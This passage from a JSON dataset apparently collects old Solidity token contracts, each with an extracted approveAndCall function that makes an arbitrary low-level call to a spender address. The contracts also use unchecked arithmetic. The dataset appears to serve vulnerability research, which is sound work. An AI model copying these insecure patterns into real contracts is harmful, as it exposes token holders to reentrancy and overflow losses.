  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract EthereumMasternode is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function EthereumMasternode(\n ) {\n balances[msg.sender] = 15000000;\n totalSupply = 15000000;\n name = \"Ethereum Masternode\";\n decimals = 0;\n symbol = \"EMN\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1539"
  },
  "filename": "33937.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract TastyFoodTruck is StandardToken {\n function () {\n throw;\n }\n string public name = 'TastyFoodTruck';\n uint8 public decimals;\n string public symbol = 'TFTT';\n string public version = 'H1.0';\n function TastyFoodTruck(\n ) {\n balances[msg.sender] = 10000000000000000;\n totalSupply = 10000000000000000;\n name = \"TastyFoodTruck\";\n decimals = 8;\n symbol = \"TFTT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb153a"
  },
  "filename": "33969.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 2100000000;\n totalSupply = 2100000000;\n name = \"RushACoin\";\n decimals = 4;\n symbol = \"RAC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb153b"
  },
  "filename": "33985.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 5000;\n totalSupply = 5000;\n name = \"DIGITAL POLLETT\";\n decimals = 0;\n symbol = \"DP\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb153c"
  },
  "filename": "34014.sol",
  "content": "pragma solidity ^0.4.8;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) public view returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) public returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n uint256 constant MAX_UINT256 = 2**256 - 1;\n function transfer(address _to, uint256 _value) public returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n uint256 allowance = allowed[_from][msg.sender];\n require(balances[_from] >= _value && allowance >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n if (allowance < MAX_UINT256) {\n allowed[_from][msg.sender] -= _value;\n }\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) public {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb153d"
  },
  "filename": "34016.sol",
  "content": "pragma solidity ^0.4.17;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) public returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) public returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n uint256 constant MAX_UINT256 = 2**256 - 1;\n function transfer(address _to, uint256 _value) public returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n uint256 allowance = allowed[_from][msg.sender];\n require(balances[_from] >= _value && allowance >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n if (allowance < MAX_UINT256) {\n allowed[_from][msg.sender] -= _value;\n }\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) public {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb153e"
  },
  "filename": "34036.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ETNPLUS is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = '1.0';\n function ETNPLUS(\n ) {\n balances[msg.sender] = 50000000000;\n totalSupply = 50000000000;\n name = \"ETN PLUS\";\n decimals = 2;\n symbol = \"ETNP\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb153f"
  },
  "filename": "34046.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000000000;\n totalSupply = 10000000000;\n name = \"Belfie Coin\";\n decimals = 3;\n symbol = \"BELF\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1540"
  },
  "filename": "34061.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract IOU is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function IOU(\n ) {\n balances[msg.sender] = 10000000;\n totalSupply = 10000000;\n name = \"Issued Obligation Unit\";\n decimals = 2;\n symbol = \"IOU\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1541"
  },
  "filename": "34077.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract WinConnectCoin is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function WinConnectCoin(\n ) {\n balances[msg.sender] = 9000000000000000000000000;\n totalSupply = 9000000;\n name = \"WinConnectCoin\";\n decimals = 18;\n symbol = \"WCC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1542"
  },
  "filename": "34082.sol",
  "content": "pragma solidity ^0.4.18;\ncontract ERC20 {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract FBT is ERC20 {\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n mapping (address => bytes1) addresslevels;\n mapping (address => uint256) feebank;\n uint256 public totalSupply;\n uint256 public pieceprice;\n uint256 public datestart;\n uint256 public totalaccumulated;\n address dev1 = 0xFAB873F0f71dCa84CA33d959C8f017f886E10C63;\n address dev2 = 0xD7E9aB6a7a5f303D3Cd17DcaEFF254D87757a1F8;\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n refundFees();\n return true;\n } else revert();\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n refundFees();\n return true;\n } else revert();\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function refundFees() {\n uint256 refund = 200000*tx.gasprice;\n if (feebank[msg.sender]>=refund) {\n msg.sender.transfer(refund);\n feebank[msg.sender]-=refund;\n }\n }\n}\ncontract FrostByte is FBT {\n event tokenBought(uint256 totalTokensBought, uint256 Price);\n event etherSent(uint256 total);\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = '0.4';\n function FrostByte() {\n name = \"FrostByte\";\n decimals = 4;\n symbol = \"FBT\";\n pieceprice = 1 ether / 256;\n datestart = now;\n }\n function () payable {\n bytes1 addrLevel = getAddressLevel();\n uint256 generateprice = getPrice(addrLevel);\n if (msg.value<generateprice) revert();\n uint256 seventy = msg.value / 100 * 30;\n uint256 dev = seventy / 2;\n dev1.transfer(dev);\n dev2.transfer(dev);\n totalaccumulated += seventy;\n uint256 generateamount = msg.value * 10000 / generateprice;\n totalSupply += generateamount;\n balances[msg.sender]=generateamount;\n feebank[msg.sender]+=msg.value-seventy;\n refundFees();\n tokenBought(generateamount, msg.value);\n }\n function sendEther(address x) payable {\n x.transfer(msg.value);\n refundFees();\n etherSent(msg.value);\n }\n function feeBank(address x) constant returns (uint256) {\n return feebank[x];\n }\n function getPrice(bytes1 addrLevel) constant returns (uint256) {\n return pieceprice * uint256(addrLevel);\n }\n function getAddressLevel() returns (bytes1 res) {\n if (addresslevels[msg.sender]>0) return addresslevels[msg.sender];\n bytes1 highest = 0;\n for (uint256 i=0;i<20;i++) {\n bytes1 c = bytes1(uint8(uint(msg.sender) / (2**(8*(19 - i)))));\n if (bytes1(c)>highest) highest=c;\n }\n addresslevels[msg.sender]=highest;\n return highest;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\n return true;\n 